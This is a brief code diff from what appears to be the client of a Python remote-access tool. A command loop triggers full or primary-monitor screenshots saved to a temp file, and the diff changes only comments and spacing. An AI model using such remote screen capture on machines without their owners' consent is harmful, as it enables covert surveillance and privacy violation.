@@ -121,14 +121,11 @@ print(fColors.BLACK + bColors.WHITE + StringFormat.BOLD +
 server_connect()
 
 # Step 27: Define `screenshot()` Function to Get Screenshot from Client
-# TODO: Implement Option choosing to get Screenshot:
-#   1. from All Monitors => --p
-#   2. from Primary Monitor => --p 1
 def screenshot(all_screens=True):
     # Take screenshot from Client
     screenshotPath = TMP + "/s.png"
 
-    # All monitors set
+    # All monitors set, take screenshot from all monitors
     if all_screens:
         screenshot = ImageGrab.grab(all_screens=True)
         screenshot.save(screenshotPath)
@@ -181,6 +178,7 @@ while True:
                 
             elif strData == 'screen':
                 screenshot()
+
             elif strData == 'prscreen':
                 screenshot(all_screens=False)
 
